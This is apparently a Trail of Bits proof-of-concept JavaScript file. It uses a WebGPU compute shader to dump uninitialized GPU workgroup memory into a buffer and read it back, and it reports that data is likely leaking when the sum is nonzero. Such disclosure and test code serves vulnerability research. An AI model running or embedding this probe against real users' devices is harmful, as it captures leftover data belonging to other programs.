/*
   Copyright 2023 Trail of Bits

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

const main = async() => {
    if (!("gpu" in navigator)) {
        console.log(
            "WebGPU is not supported. Enable chrome://flags/#enable-unsafe-webgpu flag."
        );
        return;
    }

    const adapter = await navigator.gpu.requestAdapter();
    if (!adapter) {
      console.log("Failed to get GPU adapter.");
      return;
    }
    const device = await adapter.requestDevice();

    const shaderModule = device.createShaderModule({
        code: `
@group(0) @binding(0) var<storage, read_write> recordDump : array<u32>;
var<workgroup> local : array<u32,4096>;

@compute @workgroup_size(256)
fn main(
        @builtin(local_invocation_index) local_id : u32,
        @builtin(workgroup_id) workgroup_id : vec3<u32>,
        @builtin(global_invocation_id) global_id : vec3u
        ) {
  for (var i :u32 = local_id; i < 4096u; i+=256u) {
    recordDump[4096u * workgroup_id[0] + i] = local[i];
  }
}
`
    });

    let numberWorkgroups = 32;
    let localMemoryBytes = 4096*4;
    let localMemoryU32 =  localMemoryBytes/4;
      
    const gpuBufferRecordDump = device.createBuffer({
        mappedAtCreation: true,
        size: numberWorkgroups * localMemoryBytes,
        usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC
    });
    
    const gpuBufferRecordDumpArray = gpuBufferRecordDump.getMappedRange();
    let arr3 = new Uint32Array(gpuBufferRecordDumpArray);
    for (let i = 0; i < numberWorkgroups*localMemoryU32; i++) {
        arr3[i] = 0;
    }
    gpuBufferRecordDump.unmap();


    const bindGroupLayout = device.createBindGroupLayout({
        entries: [
            {
                binding: 0,
                visibility: GPUShaderStage.COMPUTE,
                buffer: {
                    type: "storage"
                }
            }
        ]
    });

    const bindGroup = device.createBindGroup({
        layout: bindGroupLayout,
        entries: [
            {
                binding: 0,
                resource: {
                    buffer: gpuBufferRecordDump
                }
            }
        ]
    });

    const computePipeline = device.createComputePipeline({
        layout: device.createPipelineLayout({
          bindGroupLayouts: [bindGroupLayout]
        }),
        compute: {
          module: shaderModule,
          entryPoint: "main"
        }
      });
    
    const commandEncoder = device.createCommandEncoder();

    const passEncoder = commandEncoder.beginComputePass();
    passEncoder.setPipeline(computePipeline);
    passEncoder.setBindGroup(0, bindGroup);
    const workgroupCountX = numberWorkgroups;
    passEncoder.dispatchWorkgroups(workgroupCountX);
    passEncoder.end();

    const gpuReadBuffer = device.createBuffer({
        size: localMemoryBytes*numberWorkgroups,
        usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
      });
    
    commandEncoder.copyBufferToBuffer(
        gpuBufferRecordDump,
        0,
        gpuReadBuffer,
        0,
        localMemoryBytes*numberWorkgroups
    );

    const gpuCommands = commandEncoder.finish();
    device.queue.submit([gpuCommands]);

    await gpuReadBuffer.mapAsync(GPUMapMode.READ);
    const arrayBuffer = gpuReadBuffer.getMappedRange();

    var total = 0;
    let arr4 = new Uint32Array(arrayBuffer);
    for (let i = 0; i < localMemoryU32*numberWorkgroups; i++) {
        total += arr4[i];	    
    }
    console.log("total (leaking is likely if this is more than 0): " + total)

    
    return new Uint32Array(arrayBuffer);
}
